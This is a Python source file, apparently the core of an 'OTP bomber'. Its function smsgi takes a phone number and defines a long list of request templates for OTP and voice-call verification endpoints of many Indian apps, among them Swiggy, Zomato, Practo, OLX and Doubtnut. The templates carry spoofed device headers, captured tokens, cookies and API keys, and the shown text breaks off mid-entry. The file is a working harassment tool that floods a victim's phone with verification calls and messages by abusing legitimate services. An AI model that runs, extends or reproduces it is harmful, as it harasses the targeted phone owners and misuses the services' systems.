import requests
import json
import time

def smsgi(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        
        {
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "data": {
                "mobile": number
            },
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
              #  "content-length": str(len(json.dumps(data5))),
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO"
            }
        },
        {
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "data": {
                "device": "Android",
                "mobile_number": number,
                "mode": "IVR",
                "new_user": False
            },
            "headers": {
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IiIsImQuYXAiOiIiLCJkLnRyIjoiYTdmZWJjNzIyMzdiNDNmM2E1YjVmNTIxNjUxYzE0Y2QiLCJkLmlkIjoiMzM1M2I5Yjg1NDJmNDUzNyIsImQudGkiOjE2OTMyMDE5MTUwODF9fQ==",
                "traceparent": "00-a7febc72237b43f3a5b5f521651c14cd-3353b9b8542f4537-00",
                "tracestate": "@nr=0-2---3353b9b8542f4537----1693201915080",
                "x-source": "Android",
                "x-language": "en",
                "x-os": "11",
                "x-app-version-name": "8.4.3",
                "x-app-version-code": "343",
                "x-version-code": "343",
                "x-chatbot-version": "24",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            }
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "retry": True,
                "mobile": number,
                "retryType": "voice",
                "loaderMessage": "Initializing call.."
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "94"
            }
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "mobile": number,
                "appHash": "tG3K6W/hoYi"
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "48"
            }
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup?plt=2&st=1",
            "method": "GET",
            "headers": {
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\"",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                "st": "1",
                "plt": "2",
                "accept": "application/json, text/plain, */*",
                "device": "ba2a15558802b00",
                "pincode": "false",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.7",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.healthkart.com/",
                "accept-encoding": "gzip, deflate, br",
                "cookie": "adb=0; ufi=1; cf_clearance=6NwtHmrzLrHfHDe9UZgqjBzTw20eDLZJIRV6A0YTb88-1695612025-0-1-c3ce1f1.d62b60e6.5b3dbe11-0.2.1695612025"
            }
        },
        {
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "data": {
                "app_version": "7.10.2",
                "aaid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "0ae3a1bee1561e32",
                "class": "",
                "gcm_reg_id": "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"
            },
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "url": "https://micro.doubtnut.com/otp/send-call",
            "method": "PUT",
            "data": {
                "phone": number,
                "locale": "en"
            },
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/requestOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "source": "web",
                "time": "2023-09-24T08:22:25.811Z",
                "digest": "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "299",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/retryOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "time": "2023-09-24T08:22:57.160Z",
                "digest": "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "284",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
            "method": "POST",
            "data": {
                "contactNumber": number,
                "domainId": "2"
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
        {
            "url": "https://accounts.practo.com/send_voice_otp",
            "method": "POST",
            "data": {
                "fingerprint": "a40be068-c7fb-3548-9c1b-f26f363f943a",
                "mobile": "+91" + number,
                "device_name": "Xiaomi Redmi Note 7 Pro",
                "client_name": "Practo Android App"
            },
            "headers": {
                "Accept": "application/json",
                "X-DROID-VERSION": "5.84",
                "User-Agent": "Xiaomi Redmi Note 7 Pro 13",
                "X-DROID-VERSION-CODE": "719",
                "Client-Version": "Android-5.84",
                "Time-Zone": "Asia/Kolkata",
                "Client-Name": "Practo Android App",
                "API-Version": "2.0",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Host": "accounts.practo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "url": "https://www.abhibus.com/sendOtp",
            "method": "POST",
            "data": {
                "mobile": number,
                "prd": "mobile",
                "userToken": "03AFcWeA62MtH8YBpjTgPyBhVrIpuHGgFwBPs2Z1fXz93x1zikMCwCkQpkF3XKDj6DVoBo9k_pmre1d6jf7K5MEBnP1zIVVExu2k6FLjFeNs9ifNF27baZoDtci70WNWp4fm9tkfNEJI-96l0ornXSkYsZVXBgjy022-F0x1-X6JRt969GN2O6H8YZyYGUejwNTQ4X9lIy4KvkbG_zHxyUKyK2xSMmHVYIvA3BSeD7rXnihD3A4ukeYYZGEmOWLSmiaGalu5CyWDabEvkUCgvExUP_L2d4Pe8wwOrTDisp9UqzDUSx_lJghg7peLQE9sUFekju_J08eetDIkM5Ol7X-G8pUFLjL--sphbGDKvQAQhDrdARge3HxAFVsdzWTEX8LGCTNAVdBUxx7DMx5VGQPDDSzPFJJnHFD_ba3SxcGEnGGGoXpQjLBbeVkEa9FIUyaNegU_ZnCYzpm06OH3g61Wvw-Wo-a_4uVS4LcYijmpEktS2h6zQADg-zFljOCHIZQ09mFgahjmm5593bV_VvgqM1jTPq4j6EJNQcQg0EP3Ppg1ucPgoxCazgzK7_nMXgd_fQwqNznetjyMrSnpZwLud-4BeVF2P3NoL8gF6Xmwdjc19Yzdb2ZBpnGY4XRylnCtDI99uprHY6x0A1S_VHs1ZKUUBfgtgd38riY-_IVGhgXEhrCzFneSmKWyBYW7vCCJHFDHHC_p2-rNpDVWvqTdF2wxgjK3R6lJIEbocuoq5x6xOayAHDypIYlx0UlmKmVPi-aIQJ8aGuuh4eyyBfX_7CgKxx1PobvJ_Wcdm4-gYx_johZrPAAvW1pdUhdhdXXQ4_8sKuXk8ukzfqT8YcH0fs36ZEjgSIsAykRo_AhNkS2_jyfZLZYkN6ywEbwcsarVtfXYYwaBGqdS7Zo1E-qUjy1G47bfSas1psmQffJbZfooBxKy9dEIvKAtl08YqgBijfEYsGpiAkUHPDt9m8dZRsD7dhR-t-r14IeWg8r1WIM1yxTWhBlDPYtkcE4X4rUkGP_Y-0qVVyXUZL03Wf06s9JiP0o_6BvLcWjCvkza924Y7u3D1DA-cyPC-07xBESMuWy9Oqn9QGYB2LabY-635kRKhjszR2omZupjZoms5EmFDskOi7Tbaz_99MwlUXxGylMHhcVyp1ROeVW5gx5Y6h0U9uGmHqYpFZ4rmx-Nxz-AxdLl9yrYowuYGQTFeA_GT9ZqN1QvuXtlkYNsASOTb4CNwKS0V1wzB1rSOs6KBj1A4tk8ygiwTrRHU31VkmkIbkT5TalyB_M-ZCKDbQBLHD58nSI8BorHOdiO2MLgdKb5ejPLSbUzc9a2pP0R7EufIGEj4V8wW4dQWD8O00T9kDMN6ECC-t9iKYux_7xMd0v_cTkglcC1GQrkMJ5XNY8UL7a0GznQb1woI40UpM2PTzZYraTz9DUmADlkelQ0OShpqgTY1XTD9DuiGAynM7JsU3poWhsk3QkQcuhNqqV4Osrd1GX84WQTjzkN2tGq0TSQVaAsd8nZHq8a2apwkTYoS_QTgu8pc91pg3GAhHuQCHmxnMs2DFmJOH6MH54TLBOZtaRgi6HMwYcZG3yOuHvWqnlhitTpinslIn_4xZ7J9p0aZXtMcI_RQOvfaaXX04dUMIFUdKtzsLJrL35ugI77TOp_BNxmxZVtkD3KXEXT7ToueNyjxePARAi3JfPQ5SLMiwWlBUWfbQwJENyiuJ_11TukY3lBm-4lQic76LudRUxA_aVvtrwAXVOg8zmfzufk8jpUIeLd6wYpST9jLwpm_RhWckzJn-WFBTHBnimzmzP592naP4-w3sqklHDgOBQ6hKgxjqDAApgYrCfZ87MQFprHwcp5r1",
                "version": "10"
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        },
        {
            "url": "https://www.abhibus.com/otp/getOtpCall",
            "method": "POST",
            "data": {
                "mobileNum": number,
                "userToken": "03AFcWeA5ZBXQh4xE1lMZYi1aQadLmSegCgwkOu4TMN-Hd5Prxm6KCwg4gWKfaRl8NqD87Ck2KUqcaSRj0KpCf__jpwfnDDXbpYvEkeTg3stODs53G0KbBPDt8almZVmxodyPyWNXSo62lAkzUnS7St8GmjOB3W_n_j9Bc2ITHfiK4AzJJyJ6iF0_4aK6CylUG60gWtDi19q7G2ReODd-26VpmzPdOEt-2eJNtSLJsgGTcjtypPK-ubZ2jfVxzFcJFRcTdVrSkVg1wl5RdbmaUsiQ50FjZmaZYb0KPelzT1uuFmtEvgcUh10oWAONd40r30chTp1lFt2OSM31prxxM8GXO0bpjkrbmaAdahMleDH_i-2PRQuMCsUcQtYvAbInpTOvyAKOSna9Wv_lvKgHq7750_0HYq-Px4Y7g5jvR5zpAHuvUKuuaUlbO7AW4LB5_zZyXgXwMHOKToj5GUI9QiCA10T4HZX2MwsQsWuJz-CMtazuj2DfWp0mj4Aknom41F_5uzXS-9OWHFyrTJiobUrIAinzNXpHnNhipzqMw8GZY6KbDkSoncFOLuTOZ-Ho7_HUDCecDfm7GiF5xGSrzmeuBChKI6CEkwPNlHs4SaFnzo6vW1bQZ9P0Jpu5oM8b5zBJisaVQFMMzW6cXCYqrIPDzvpvcJY0cvwsVVFvAOEdCtlD4vrFQ2hRcFqgROl6yASg940QeVlsk01O9LYHLQCvFZlDvo5Wfva8y9WUaMeqWU-Cn5ohgDUm_mBs6eFt-0jL6s1dWKi6ZW31amQxtQmk0uTufsL0fKBXmoNC5chnh1FFbCmFxYUHMJ3Ix-C1e-9ePAeVLRmbHOwSKv29mGCnjkgTFsQ3uUxPp7Z91gL93K1J2zQpt4c_XwrgGca8YCx0D34U2DU8VpQD4Nsahh61mNwrpsTz6_TCmqZjPY2kNF7dulhkP6brT18cXZURK9xe5YUvBfqVcnczmJzbd5j7voRNd3NZMtaeFIYRukceQEYi8A9Uc4Z1dvOzKWgSXO9yg_rHp2StudYpcGja4T7xSXWghu9l4evMbhwYi10cxJORlJFlDKe0gE4v0b2vZy6EDcNZVVKxs_X6cHEgTAy-oho-6JiaXwtE209eBJAzWgLMFoagBhW_7fhEi8WEMQeYM-adfOPgZ5vrZxQfclzQxZwQVoC2W25GxHTStuXR-koprUjt7Lhov586MxIljmlPv6dTypmPkpxUySv3KY9fJpRCT3VavfYr1LbpKB07DMmsbmHathQy3OyV-Qaw24kp6YDNGzb-UcNS88fyxtKAWFmiF2X1NOJb8hVMI8rKT0IZfXR24xHzyQG9lyfPhkmkD1D2NBWZqhifh_ye_2ZTD7vOBI4sr4m4git-eMRmhJi0tYuqRgnZOR12Jq82790b2dgLOi1_nb9wHy9b2LCwNynioOXarXEP2DTIYp22Xqev7FoFwdTvno7WzHdViABEM0qc8pC-Uod073aOfbAuXIFAsesZt5lfp3Lf33YIbak6cpWBEccxS2xyvIeyAiZNGxjH1hDJ7qGAdufAOEJCJT7fiW-lGSozJxGWS_ItlligHNN_7c5lfVpWZUADtTYQPGPd2V3O7nw64bf2v0oT9xbZMxt12RmOc9Ko2Zn3uJCJ4f9GQP5ox7lHQRJYxbddycD0B3mGE1PmIOGxnsweJ9AGvTjF4bflxrjEAgNj9LLcle-fqyKhxU6TX8jSQ9sVX2XYpEYox_m9osgp47RXKbADmV7itVKogwjDm_2Y4rhTncuYzz9dRFeHbSOXrQScvkuuEDZXVG6UpWS_tDUSRYvvJClbL1xisrOB_4sa3mM9OLGq8XNg6FplEdwRDzM0hpq2CTG_"
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/plain, */*",
                "x-app-name": "msiten",
                "x-mweb-version": "1.4.2",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36"
            }
        },
        {
            "url": "https://www.cult.fit/api/auth/loginPhoneSendOtp",
            "method": "POST",
            "data": {
                "branchAnalyticsData": {},
                "phone": number,
                "medium": "call",
                "countryCallingCode": "+91",
                "deviceInfo": {
                    "appId": "fit.cure.android",
                    "bundleId": "fit.cure.android",
                    "brand": "Xiaomi",
                    "model": "Redmi Note 7 Pro",
                    "osName": "Android",
                    "osVersion": "13",
                    "deviceId": "aba34bc1f2672cc6",
                    "encryptedDeviceId": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                    "localeCountryCode": "US",
                    "size": {"height": 822, "width": 393},
                    "colorScheme": "dark"
                }
            },
            "headers": {
                "Host": "www.cult.fit",
                "accept": "application/json",
                "clientversion": "10.21",
                "osname": "android",
                "accept-encoding": "gzip",
                "timezone": "Asia/Kolkata",
                "codepushversion": "undefined",
                "deviceid": "aba34bc1f2672cc6",
                "encrypteddeviceid": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                "devicebrand": "Xiaomi",
                "devicemodel": "Redmi Note 7 Pro",
                "x-request-id": "18e6f566-9311-d97a-77f2-c987db0a71c7",
                "x-tenant-id": "curefit",
                "advertiserid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "content-type": "application/json",
             #   "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/4.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://api.zomato.com/v2/user_login/initiate?android_country=US&lang=en&android_language=en&city_id=-1",
            "headers": {
                "Host": "api.zomato.com",
                "content-length": "131",
                "x-appsflyer-uid": "1692101582494-5255636354974981849",
                "x-present-lat": "0.0",
                "x-user-defined-lat": "0.0",
                "x-jumbo-session-id": "4bab808d-a018-47d4-ada9-9bcced38c52f1692101582",
                "x-accessibility-voice-over-enabled": "0",
                "user-agent": "&source=android_market&version=13&device_manufacturer=Xiaomi&device_brand=Xiaomi&device_model=Redmi+Note+7+Pro&api_version=765&app_version=v17.6.5",
                "x-device-language": "en-US",
                "x-rider-installed": "false",
                "x-zomato-client-id": "5276d7f1-910b-4243-92ea-d27e758ad02b",
                "x-present-long": "0.0",
                "x-client-id": "zomato_android_v2",
                "x-network-type": "wifi",
                "x-zomato-uuid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "x-app-language": "&lang=en&android_language=en&android_country=US",
                "x-firebase-instance-id": "ff7f36e38e9a4a81c47b7b7b513d1079",
                "x-device-pixel-ratio": "2.75",
                "x-o2-city-id": "-1",
                "x-android-id": "70fdf49b1f43f5ca",
                "x-zomato-app-version-code": "1710017650",
                "accept": "image/webp",
                "x-request-id": "a5e650d2-e40b-4add-b6cd-a796ec8244cb",
                "x-zomato-app-version": "765",
                "x-city-id": "-1",
                "x-device-width": "1080",
                "pragma": "akamai-x-get-request-id,akamai-x-cache-on, akamai-x-check-cacheable",
                "x-vpn-active": "1",
                "x-device-height": "2260",
                "x-user-defined-long": "0.0",
                "x-installer-package-name": "com.android.vending",
                "x-blinkit-installed": "false",
                "x-access-uuid": "c59c4031-8325-4686-a866-57a73b74d342",
                "x-accessibility-dynamic-text-scale-factor": "1.0",
                "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
                "x-dv-token": "DT_wA_YJZxu93CqKYPVr7VsQUhIYFwsEXIDtRrij4wL3h2",
                "user-bucket": "0",
                "user-high-priority": "1",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip, deflate, br"
            },
            "data": {
                "phone": number,
                "country_id": "1",
                "package_name": "",
                "verification_type": "call",
                "message_uuid": "sms-service-v2-7d7026e5-00d9-46da-802f-3c0b74250afb"
            }
        },
        {
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "data": {
                "mobile": number,
                "organizationId": "5eb393ee95fab7468a79d189"
            },
            "headers": {
                "sec-ch-ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "client-version": "1114",
                "Authorization": "Bearer YOUR_BEARER_TOKEN",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://www.pw.live/",
                "randomId": "9242fe67-d24e-4fb1-8859-3d726e2471e3",
                "client-id": "5eb393ee95fab7468a79d189",
                "Client-Type": "WEB",
                "sec-ch-ua-platform": '"Windows"'
            }
        },
        {
            "url": "https://api.olx.in/v2/auth/authenticate",
            "method": "POST",
            "data": {
                "grantType": "retry",
                "method": "call",
                "phone": "+91" + number
            },
            "headers": {
                "X-acf-sensor-data": "2,a,TMpKRTdoxJtA/bMtiQzskHx92U6siCaYWjBkNZaMsStuWWZ8O8m6MzoKfX2vfY1xHLr/yo3Gqb3Vyw7O39A0je0OuB/iUnEP/aai7Yu2g6XMOz8xlVpX8eB9l+dURtyhEypM+M/xqVEAXdyalyPrduvFtnx0TCyuwW6tau2maDo=,BHMkuAHLVGza6cgDuEpwN3QKPTKW0J+/J2TLj3blpjuyO2/GWlcYTZ44H7+LkSFzHOcUQibNhCZtqbTXTyo+4d6273WfIbB3vkcukA+1ZwN5WPbPJdx6FLRlhNclsMNT9lBjM6POZNnL67jknhAXDyoW+S9g/G6X0G/S4b5fWt4=\$c1f0jtr7Zs8nbUt4eHfw69RdeiqQJ+NdjDegCxj44oKDW/ki2UnT8vXzSLfAA+0HCYmhE1ESUyb8yywzdvmiXKhD82hIydxgQpVLtK9ctAHV5ASNLotwuqhi0gfPEZAgzeB9J+0XMhZ2mk+3A3jVaPdU0ya9eOlNXqy+V7zq0x1p6keahAFF2wgyqpq2775oq+OsP6OojhZI22tm0ZcsD7ElJ60GvKf1hDxtxxv8xugjeNG7CazWqHDpTL7Fb5BA/emn/lalI+JvhMaRc65RGNvfolQ2nVugn5dtJkG/BkwSayn/1Gtke4lHr9CqqOnb5gNhXDZ96hIGJtw8B+0HznBNetWq06xuAFSnjzd+vx/wc53NrHRPikfWhNeeJumE2U9WFuWZOHdb4hBvxQuOxDUNhiIP79n1qfVfszDhZ5Ezn7WFIO7Pl5KD6OHvDfCUzZeJ/g4vGUdrjDvq247LANeV/CqsqSVASZzP26BnANtgFF6kQAgATvvXwCcBYDpEIOeM0s27vMiDOemQiDqOpMYmdhAEjL2Vbvy6w3WY5X0roTcOFiXBqn8VsVEHiHHDEszzDxbNV2ueDV5Du7nRfTLt9ZF9LzJzy0sd9639DgmYm4r2CyYw9rIrQZHZhZ5G/DJml9r8XghR2ZulvClJfwhf1T/Xe8fNozCN9+Bm2+jOpWDfR9HZafMiWyuEGtyaekFRA2bgRVt25Q5vtRMgwQqoAmXHJ/YY8SWLFLY2NfFBkVCAjEuW5+Z6lISBL4KgyIrcz9FA/K4hzWz7sChPr2Wz6cwe6f6y50RanzhQRVn7Sac5MnJ0EbqArp+GqzleKCg1kZfNtVnB0HQqTLs29P+hA2DHct3KxFl0kEtL91w+81Y06s759oFINDics0ik1YL5Ghm0M+sdzmuvd7BVTm16Dpwg27/Dnf+BCs7+zGz2DXD4q3mNZ0U+neXYgGinKIRiUkf6ATs/RKsz41TVvQE1lTiZ4L9Sdqqyuu05/YRZrXNlx/uOkWEemsiM2B6Xq/OZC27b1aLbz4q4QIKzpjzN7fY9brMalcu5MVzm4GU=",
                "X-Panamera-fingerprint": "807da1a35e55235e",
                "User-Agent": "android 17.08.011 olxin",
                "x-origin-panamera": "Production",
                "laquesis": "pan-41767@b#pan-48465@b#pan-52057@b#pan-53615@b#pan-55363@b#pan-55982@b#pan-59448@b#pan-62267@a#pan-68253@a#road-43386@b#road-47263@a#road-74127@b",
                "laquesisff": "rate_us#resend_code_call_me#listers_verification#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327#pan-42666#pan-45244#pan-48529#pan-48912#pan-50288#pan-50705#pan-57022#road-123",
                "Content-Type": "application/json; charset=UTF-8",
           #     "Content-Length": str(len(json.dumps(data))),
                "Host": "api.olx.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "method": "POST",
            "url": "https://api.1mg.com/api/v6/create_token",
            "headers": {
                "Host": "api.1mg.com",
                "x-platform": "Android-17.4.3",
                "x-access-key": "1mg_client_access_key",
                "x-device-id": "3dcc536049db72ae",
                "x-os-version": "13",
                "x-visitor-id": "739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552",
                "device-info": "Xiaomi/Redmi Note 7 Pro/33/13",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "cookie": "VISITOR-ID=739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "otp_on_call": True,
                "number": number
            }
        },
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
